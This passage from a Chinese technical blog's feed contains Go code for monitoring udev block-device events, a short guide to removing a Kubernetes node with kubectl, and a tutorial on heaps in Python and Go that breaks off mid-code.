class="line"><span class="function"><span class="keyword">func</span> <span class="title">rawUdevBlockMonitor</span><span class="params">(c <span class="keyword">chan</span> <span class="keyword">string</span>, matches, exclusions []<span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment">// stdbuf -oL performs line bufferred output</span></span><br><span class="line"><span class="comment">// 后台执行 udevadm monitor 命令</span></span><br><span class="line">cmd := exec.Command(<span class="string">"stdbuf"</span>, <span class="string">"-oL"</span>, <span class="string">"udevadm"</span>, <span class="string">"monitor"</span>, <span class="string">"-u"</span>, <span class="string">"-k"</span>, <span class="string">"-s"</span>, <span class="string">"block"</span>)</span><br><span class="line">stdout, err := cmd.StdoutPipe()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">logger.Warningf(<span class="string">"Cannot open udevadm stdout: %v"</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = cmd.Start()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">logger.Warningf(<span class="string">"Cannot start udevadm monitoring: %v"</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过 bufio.NewScanner 实时获取 udevadm monitor 命令输出结果</span></span><br><span class="line">scanner := bufio.NewScanner(stdout)</span><br><span class="line"><span class="keyword">for</span> scanner.Scan() &#123;</span><br><span class="line">text := scanner.Text()</span><br><span class="line">logger.Debugf(<span class="string">"udevadm monitor: %s"</span>, text)</span><br><span class="line"><span class="comment">// 对输出结果进行正则匹配</span></span><br><span class="line">match, err := matchUdevEvent(text, matches, exclusions)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">logger.Warningf(<span class="string">"udevadm filtering failed: %v"</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> match &#123;</span><br><span class="line">    <span class="comment">// 若匹配成功，则将结果发送到对应 channel，即 events</span></span><br><span class="line">c &lt;- text</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := scanner.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">logger.Warningf(<span class="string">"udevadm monitor scanner error: %v"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logger.Info(<span class="string">"udevadm monitor finished"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Monitors udev for block device changes, and collapses these events such that</span></span><br><span class="line"><span class="comment">// only one event is emitted per period in order to deal with flapping.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">udevBlockMonitor</span><span class="params">(c <span class="keyword">chan</span> <span class="keyword">string</span>, period time.Duration)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment">// return any add or remove events, but none that match device mapper</span></span><br><span class="line"><span class="comment">// events. string matching is case-insensitve</span></span><br><span class="line"><span class="comment">// 定义 events channel，用于传输匹配结果</span></span><br><span class="line">events := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line"><span class="keyword">go</span> rawUdevBlockMonitor(events,</span><br><span class="line">    <span class="comment">// 正则表达式，用于获取设备名称</span></span><br><span class="line">[]<span class="keyword">string</span>&#123;<span class="string">"(?i)add"</span>, <span class="string">"(?i)remove"</span>&#125;,</span><br><span class="line">[]<span class="keyword">string</span>&#123;<span class="string">"(?i)dm-[0-9]+"</span>, <span class="string">"(?i)rbd[0-9]+"</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">    <span class="comment">// 死循环，不断从 events channel 中获取匹配后的结果</span></span><br><span class="line">event, ok := &lt;-events</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">timeout := time.NewTimer(period)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">    <span class="comment">// 这里如果在 timeout 时间周期内，出现多次 events，貌似会丢弃掉后续 event 信息，不知道出于什么考虑。。</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-timeout.C:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">case</span> _, ok := &lt;-events:</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">c &lt;- event</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="http://www.reactivated.net/writing_udev_rules.html" target="_blank" rel="noopener">http://www.reactivated.net/writing_udev_rules.html</a> </li><li><a href="https://www.thegeekdiary.com/beginners-guide-to-udev-in-linux/" target="_blank" rel="noopener">https://www.thegeekdiary.com/beginners-guide-to-udev-in-linux/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;如果在 PC 上安装过 Linux，那么通常会遇到过硬件设备无法发现的问题，这类问题最终都可以通过 google 来解决掉。那么当我们在服务
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://zdyxry.github.io/tags/Linux/"/>
    
      <category term="Golang" scheme="https://zdyxry.github.io/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes 实战-平滑移除节点</title>
    <link href="https://zdyxry.github.io/2019/08/01/Kubernetes-%E5%AE%9E%E6%88%98-%E5%B9%B3%E6%BB%91%E7%A7%BB%E9%99%A4%E8%8A%82%E7%82%B9/"/>
    <id>https://zdyxry.github.io/2019/08/01/Kubernetes-实战-平滑移除节点/</id>
    <published>2019-08-01T15:07:29.000Z</published>
    <updated>2019-08-02T15:08:09.794Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>自己玩 K8S 以来，搭建的环境没有10几套，也有5，6套了，当环境测试完成后，基本上直接删除掉了，也没有想着一直维护，最近在维护一个集群的时候，想要删除一个节点，发现自己一直不知道如何删除节点，特此记录。</p><h2 id="平滑移除"><a href="#平滑移除" class="headerlink" title="平滑移除"></a>平滑移除</h2><h3 id="获取节点列表"><a href="#获取节点列表" class="headerlink" title="获取节点列表"></a>获取节点列表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get node</span><br></pre></td></tr></table></figure><h3 id="设置不可调度"><a href="#设置不可调度" class="headerlink" title="设置不可调度"></a>设置不可调度</h3><p>由于节点目前处于正常工作状态，集群中新建资源还是有可能创建到该节点的，所以先将节点设置为不可调度：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl cordon <span class="variable">$node_name</span></span><br></pre></td></tr></table></figure><h3 id="将节点上资源调度到其他节点"><a href="#将节点上资源调度到其他节点" class="headerlink" title="将节点上资源调度到其他节点"></a>将节点上资源调度到其他节点</h3><p>目前集群已经不会分配新的资源在该节点上了，但是节点还运行着现有的业务，所以我们需要将节点上的业务分配到其他节点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl drain <span class="variable">$node_name</span></span><br></pre></td></tr></table></figure><p>注意：DaemonSet Pod 和 Static Pod 是不会在集群中其他节点重建的。</p><h3 id="移除节点"><a href="#移除节点" class="headerlink" title="移除节点"></a>移除节点</h3><p>当前集群中已经没有任何资源分配在节点上了，那么我们可以直接移除节点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl delete <span class="variable">$node_name</span></span><br></pre></td></tr></table></figure><p>至此，我们平滑移除了一个 k8s 节点。如果移除的是一个 master 节点，那么记得之后还要添加一个新的 master 节点到集群中，避免集群可靠性降低。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://stackoverflow.com/questions/35757620/how-to-gracefully-remove-a-node-from-kubernetes" target="_blank" rel="noopener">https://stackoverflow.com/questions/35757620/how-to-gracefully-remove-a-node-from-kubernetes</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;自己玩 K8S 以来，搭建的环境没有10几套，也有5，6套了，当环境测试完成后，基本上直接删除掉了，也没有想着一直维护，最近在维护一个集群的
      
    
    </summary>
    
    
      <category term="Kubernetes" scheme="https://zdyxry.github.io/tags/Kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>Heap In Python &amp; Golang</title>
    <link href="https://zdyxry.github.io/2019/07/28/Heap-In-Python-Golang/"/>
    <id>https://zdyxry.github.io/2019/07/28/Heap-In-Python-Golang/</id>
    <published>2019-07-28T04:11:45.000Z</published>
    <updated>2019-07-28T04:16:47.995Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近使用到了 heap 这个数据结构，记录一下在 Python 和 Golang 中最基本的使用方法～ </p><blockquote><p>堆（英语：Heap）是计算机科学中的一種特別的樹狀数据结构。若是滿足以下特性，即可稱為堆積：「給定堆積中任意節點P和C，若P是C的母節點，那麼P的值會小於等於（或大於等於）C的值」。若母節點的值恆小於等於子節點的值，此堆積稱為最小堆積（min heap）；反之，若母節點的值恆大於等於子節點的值，此堆積稱為最大堆積（max heap）。在堆積中最頂端的那一個節點，稱作根節點（root node），根節點本身沒有母節點（parent node）。</p></blockquote><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="create"><a href="#create" class="headerlink" title="create"></a>create</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> heapq</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: a = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: heapq.heapify(a)</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: a</span><br><span class="line">Out[<span class="number">4</span>]: [<span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: b = []</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: heapq.heappu</span><br><span class="line">heapq.heappush     heapq.heappushpop</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: heapq.heappush(b, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: heapq.heappush(b, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: heapq.heappush(b, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: heapq.heappush(b, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: heapq.heappush(b, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: b</span><br><span class="line">Out[<span class="number">11</span>]: [<span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure><h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">28</span>]: b</span><br><span class="line">Out[<span class="number">28</span>]: [<span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">29</span>]: heapq.nlargest(<span class="number">3</span>, b)</span><br><span class="line">Out[<span class="number">29</span>]: [<span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">30</span>]: heapq.nsmallest(<span class="number">2</span>, b)</span><br><span class="line">Out[<span class="number">30</span>]: [<span class="number">1</span>, <span class="number">2</span>]</span><br></pre></td></tr></table></figure><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">32</span>]: heapq.heappush(b, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">33</span>]: b</span><br><span class="line">Out[<span class="number">33</span>]: [<span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">39</span>]: heapq.heapreplace(b, <span class="number">7</span>)</span><br><span class="line">Out[<span class="number">39</span>]: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">40</span>]: b</span><br><span class="line">Out[<span class="number">40</span>]: [<span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">41</span>]: a = [<span class="number">6</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">42</span>]: heapq.heapify(a)</span><br><span class="line"></span><br><span class="line">In [<span class="number">43</span>]: b</span><br><span class="line">Out[<span class="number">43</span>]: [<span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">45</span>]: c = heapq.merge(a,b)</span><br><span class="line"></span><br><span class="line">In [<span class="number">46</span>]: list(c)</span><br><span class="line">Out[<span class="number">46</span>]: [<span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">50</span>]: b</span><br><span class="line">Out[<span class="number">50</span>]: [<span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">51</span>]: heapq.heappop(b)</span><br><span class="line">Out[<span class="number">51</span>]: <span class="number">2</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">52</span>]: b</span><br><span class="line">Out[<span class="number">52</span>]: [<span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">6</span>]</span><br></pre></td></tr></table></figure><h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><p>Golang 中没有 heapq 这种封装好的库可以直接使用，不过有 <code>container/heap</code> ，提供了同样的方法，只是我们需要先对我们的操作对象实现搜有的 <code>heap.Interface</code>  方法。</p><h2 id="Constructor"><a href="#Constructor" class="headerlink" title="Constructor"></a>Constructor</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This example demonstrates an integer heap built using the heap interface.</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"container/heap"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// An IntHeap is a min-heap of ints.</span></span><br><span class="line"><span class="keyword">type</span> IntHeap []<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h IntHeap)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span></span>           &#123; <span class="keyword">return</span> <span class="built_in">len</span>(h) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h IntHeap)</span> <span class="title">Less</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123; <span class="keyword">return</span> h[i] &lt; h[j] &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h IntHeap)</span> <span class="title">Swap</span><span class="params">(i, j <span class="keyword">int</span>)</span></span>      &#123; h[i], h[j] = h[j], h[i] &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *IntHeap)</span> <span class="title">Push</span><span class="params">(x <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line"><span class="comment">// Push and Pop use pointer receivers because they modify the slice's length,</span></span><br><span class="line"><span class="comment">// not just its contents.</span></span><br><span class="line">*h = <span class="built_in">append</span>(*h, x.(<span class="keyword">int</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取最后一个元素，在 `container/heap.Pop` 中，将堆顶的元素放置在最后，然后调用 `container/heap.Down` 将当前堆顶元素下沉到适当位置。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *IntHeap)</span> <span class="title">Pop</span><span class="params">()</span> <span class="title">interface</span></span>&#123;&#125; &#123;</span><br><span class="line">old := *h</span><br><span class="line">n := <span class="built_in">len</span>(old)</span><br><span class="line">x := old[n<span class="number">-1</span>]</span><br><span class="line">*h = old[<span class="number">0</span> : n<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// // An IntHeap is a max-heap of ints.</span></span><br><span class="line"><span class="keyword">type</span> MaxHeap <span class="keyword">struct</span> &#123;</span><br><span class="line">IntHeap</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h MaxHeap)</span> <span class="title">Less</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123; <span class="keyword">return</span> h.IntHeap[i] &gt; h.IntHeap[j] &#125;</span><br></pre></td></tr></table></figure><h3 id="create-1"><a href="#create-1" class="headerlink" title="create"></a>create</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This example demonstrates an integer heap built using the heap interface.</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"container/heap"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// This example inserts several ints into an IntHeap, checks the minimum,</span></span><br><span class="line"><span class="comment">// and removes them in order of priority.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">h := &amp;IntHeap&#123;<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>&#125;</span><br><span class="line">heap.Init(h)</span><br><span class="line">heap.Push(h, <span class="number">3</span>)</span><br><span class="line">fmt.Printf(<span class="string">"minimum: %d\n"</span>, (*h)[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> h.Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">"%d "</span>, heap.Pop(h))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="read-1"><a href="#read-1" class="headerlink" title="read"></a>read</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"container/heap"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">h := &amp;IntHeap&#123;<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>&#125;</span><br><span class="line">heap.Init(h)</span><br><span class="line">heap.Push(h, <span class="number">3</span>)</span><br><span class="line">fmt.Printf(<span class="string">"minimum: %d\n"</span>, (*h)[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> h.Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">"%d "</span>, heap.Pop(h))</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println()</span><br><span class="line"></span><br><span class="line">h1 := &amp;MaxHeap&#123;[]<span class="keyword">int</span>&#123;<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>&#125;&#125;</span><br><span class="line">heap.Init(h1)</span><br><span class="line">heap.Push(h1, <span class="number">3</span>)</span><br><span class="line">fmt.Printf(<span class="string">"maximum: %d\n"</span>, h1.IntHeap[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> h1.Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">"%d "</span>, heap.Pop(h1))</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="update-1"><a href="#update-1" class="headerlink" title="update"></a>update</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"container/heap"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">h := &amp;IntHeap&#123;<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>&#125;</span><br><span class="line">heap.Init(h)</span><br><span class="line">heap.Push(h, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> h.Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">"%d "</span>, heap.Pop(h))</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="delete-1"><a href="#delete-1" class="headerlink" title="delete"></a>delete</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This example demonstrates an integer heap built using the heap interface.</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"container/heap"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// An IntHeap is a min-heap of ints.</span></span><br><span class="line"><span class="keyword">type</span> IntHeap []<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h IntHeap)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span></span>           &#123; <span class="keyword">return</span> <span class="built_in">len</span>(h) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h IntHeap)</span> <span class="title">Less</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123; <span class="keyword">return</span> h[i] &lt; h[j] &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h IntHeap)</span> <span class="title">Swap</span><span class="params">(i, j <span class="keyword">int</span>)</span></span>      &#123; h[i], h[j] = h[j], h[i] &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *IntHeap)</span> <span class="title">Push</span><span class="params">(x <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line"><span class="comment">// Push and Pop use pointer receivers because they modify the slice's length,</span></span><br><span class="line"><span class="comment">// not just its contents.</span></span><br><span class="line">*h = <span class="built_in">append</span>(*h, x.(<span class="keyword">int</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *IntHeap)</span> <span class="title">Pop</span><span class="params">()</span> 